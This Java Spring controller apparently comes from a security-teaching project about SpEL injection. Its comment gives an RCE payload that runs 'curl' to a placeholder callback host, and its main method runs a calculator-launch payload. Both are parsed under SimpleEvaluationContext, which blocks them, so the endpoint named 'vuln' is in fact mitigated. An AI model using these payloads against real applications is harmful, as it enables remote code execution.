package org.joychou.controller;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // SimpleEvaluationContext: no type references (T()), constructors or bean references.
        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        Object result = parser.parseExpression(expression).getValue(context);
        return String.valueOf(result);
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        try {
            System.out.println(parser.parseExpression(expression).getValue(context));
        } catch (RuntimeException e) {
            System.out.println("Blocked by SimpleEvaluationContext: " + e.getMessage());
        }
    }
}

